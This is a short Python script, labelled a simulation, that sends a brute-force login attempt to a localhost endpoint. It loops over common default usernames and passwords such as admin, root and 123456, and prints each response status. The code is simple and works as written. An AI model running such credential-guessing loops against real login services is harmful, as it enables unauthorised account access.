
import requests
import json

def simulate_brute_force_attack():
    """Simulates a brute-force attack on a login endpoint."""
    url = "http://localhost:8000/login" # A non-existent endpoint
    headers = {'Content-Type': 'application/json'}
    
    usernames = ["admin", "root", "user"]
    passwords = ["password", "123456", "admin"]

    print("Simulating brute-force attack...")
    for username in usernames:
        for password in passwords:
            payload = {"username": username, "password": password}
            try:
                response = requests.post(url, headers=headers, data=json.dumps(payload))
                print(f"Attempt with {username}:{password} - Status: {response.status_code}")
            except requests.exceptions.ConnectionError as e:
                print(f"Connection error: {e}")

if __name__ == '__main__':
    simulate_brute_force_attack()
